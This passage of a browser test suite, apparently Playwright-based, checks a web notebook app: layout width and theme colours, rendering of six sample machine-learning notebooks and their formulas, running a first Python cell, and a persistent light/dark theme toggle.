        await openNotebook(page, env.demoNotebook, 'demo.ipynb')
        await runAll(page)
        await waitSaved(page)
        await page.evaluate(() => document.fonts.ready)
        const sizes = await page.evaluate(() => ({
          scrollWidth: document.documentElement.scrollWidth,
          innerWidth: window.innerWidth,
          background: getComputedStyle(document.body).backgroundColor,
          wide: Array.from(document.querySelectorAll('#app *'))
            .filter((node) => node.getBoundingClientRect().right > window.innerWidth + 1 && !node.closest('.cm-scroller, .output-rich, .cell-rendered, pre'))
            .map((node) => node.className)
            .slice(0, 5),
        }))
        assert(sizes.scrollWidth <= sizes.innerWidth, `no horizontal scrolling at ${width} px (${sizes.scrollWidth} > ${sizes.innerWidth}; ${sizes.wide.join(', ')})`)
        const [r, g, b] = sizes.background.match(/\d+/g).map(Number)
        assert(scheme === 'dark' ? r + g + b < 150 : r + g + b > 600, `${scheme} background colour (${sizes.background})`)
        assertEqual(unexpected(problems), [], 'console problems')
        if (env.screenshotDir) {
          await page.evaluate(() => window.scrollTo(0, 0))
          await page.screenshot({ path: `${env.screenshotDir}/notebook-${width}-${scheme}.png`, fullPage: true })
          await page.screenshot({ path: `${env.screenshotDir}/notebook-${width}-${scheme}-top.png` })
        }
        await context.close()
      }
    })
  }

  suite.test('every sample notebook opens from the menu and renders its text and formulas', async () => {
    const { context, page, problems } = await fresh()
    const expected = {
      '00-check-your-setup.ipynb': '00 · Check your setup',
      '01-speech-to-text.ipynb': '01 · Speech to text with Whisper',
      '02-text-to-speech.ipynb': '02 · Text to speech with SpeechT5',
      '03-llm-tokens-and-sampling.ipynb': '03 · A language model, one token at a time',
      '04-attention-from-scratch.ipynb': '04 · Attention from scratch',
      '05-diffusion-toy.ipynb': '05 · Diffusion on toy data',
    }
    for (const [file, title] of Object.entries(expected)) {
      await page.selectOption('#notebook-select', `sample:${file}`)
      await page.waitForFunction((name) => document.title.startsWith(name), file)
      assertEqual(await page.locator('.cell h1').first().innerText(), title, `${file}: title`)
      const facts = await page.evaluate(() => ({
        code: document.querySelectorAll('.cell-code').length,
        checks: document.querySelectorAll('.cell.is-check').length,
        formulaErrors: document.querySelectorAll('.katex-error').length,
        strayDollars: Array.from(document.querySelectorAll('.cell-rendered')).filter((node) => {
          const copy = node.cloneNode(true)
          copy.querySelectorAll('.katex, code').forEach((part) => part.remove())
          return copy.textContent.includes('$')
        }).length,
        summary: document.querySelector('.checks-summary').innerText,
        scrollWidth: document.documentElement.scrollWidth,
      }))
      assert(facts.code >= 5, `${file}: has code cells`)
      assert(facts.checks >= 1, `${file}: has at least one check cell`)
      assertEqual(facts.formulaErrors, 0, `${file}: every formula parses`)
      assertEqual(facts.strayDollars, 0, `${file}: no formula was left as text`)
      assertEqual(facts.summary, `Checks: 0 of ${facts.checks} passed`, `${file}: the summary counts the check cells`)
      assert(facts.scrollWidth <= 1280, `${file}: no sideways scrolling`)
      if (env.screenshotDir) {
        await page.evaluate(() => document.fonts.ready)
        await page.screenshot({ path: `${env.screenshotDir}/sample-${file.replace('.ipynb', '')}.png`, fullPage: true })
      }
    }
    // The first code cell of notebook 00 needs only Python: it runs here.
    await page.selectOption('#notebook-select', 'sample:00-check-your-setup.ipynb')
    await page.waitForFunction(() => document.title.startsWith('00-check'))
    await page.locator('.cell-code').first().locator('.run-button').click()
    await waitIdle(page)
    assertIncludes(await page.locator('.cell-code').first().locator('.cell-outputs').innerText(), 'Running in: emscripten', 'notebook 00 starts')
    assertEqual(unexpected(problems), [], 'console problems')
    await context.close()
  })

  suite.test('theme button switches between light and dark and is remembered', async () => {
    const { context, page } = await fresh({ colorScheme: 'light' })
    await page.getByRole('button', { name: 'Switch to the dark theme' }).click()
    assertEqual(await page.evaluate(() => document.documentElement.dataset.theme), 'dark', 'dark theme is set')
    await page.reload()
    await page.waitForSelector('.cell')
    assertEqual(await page.evaluate(() => document.documentElement.dataset.theme), 'dark', 'the choice survives a reload')
    await page.getByRole('button', { name: 'Switch to the light theme' }).click()
    assertEqual(await page.evaluate(() => document.documentElement.dataset.theme), 'light', 'back to light')
    await context.close()
  })
}
